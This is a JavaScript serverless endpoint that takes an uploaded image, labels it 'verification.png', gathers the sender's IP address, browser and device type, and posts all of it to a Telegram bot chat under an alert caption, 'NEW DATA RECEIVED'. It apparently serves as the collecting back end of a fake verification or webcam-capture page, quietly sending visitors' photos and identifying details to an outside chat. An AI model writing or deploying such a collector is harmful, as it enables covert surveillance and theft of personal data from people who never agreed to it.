const { isUserAllowed } = require('../bot-admin');

export default async function handler(req, res) {
  // Set CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { image } = req.body;
    
    if (!image) {
      return res.status(400).json({ error: 'No image data' });
    }

    // For now, allow all users (simplified)
    // You can add user validation here later
    
    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.CHAT_ID;

    if (!botToken || !chatId) {
      return res.status(500).json({ error: 'Bot not configured' });
    }

    // Remove data URL prefix
    const base64Data = image.replace(/^data:image\/\w+;base64,/, '');
    const imageBuffer = Buffer.from(base64Data, 'base64');

    // Get client info
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'Unknown';
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const time = new Date().toLocaleString('id-ID');
    
    let deviceType = 'Desktop';
    if (/Mobile|Android|iPhone/i.test(userAgent)) deviceType = 'Mobile';
    if (/Tablet|iPad/i.test(userAgent)) deviceType = 'Tablet';

    const caption = `🚨 **DATA BARU DITERIMA** 🚨\n\n`
                 + `📍 **IP Address:** \`${ip}\`\n`
                 + `🖥️ **Device:** ${deviceType}\n`
                 + `🌐 **Browser:** ${userAgent.substring(0, 50)}...\n`
                 + `🕒 **Waktu:** ${time}\n\n`
                 + `⚠️ **Data dari Admin System**`;

    // Convert to blob
    const blob = new Blob([imageBuffer], { type: 'image/png' });
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', blob, 'verification.png');
    formData.append('caption', caption);
    formData.append('parse_mode', 'Markdown');

    // Send to Telegram
    const telegramResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
      method: 'POST',
      body: formData
    });

    const result = await telegramResponse.json();

    if (telegramResponse.ok) {
      return res.status(200).json({ 
        status: 'success', 
        message: 'Photo sent to Telegram' 
      });
    } else {
      return res.status(500).json({ 
        status: 'error', 
        message: 'Telegram API error: ' + (result.description || 'Unknown error')
      });
    }

  } catch (error) {
    console.error('Error:', error);
    return res.status(500).json({ 
      status: 'error', 
      message: 'Server error: ' + error.message 
    });
  }
}
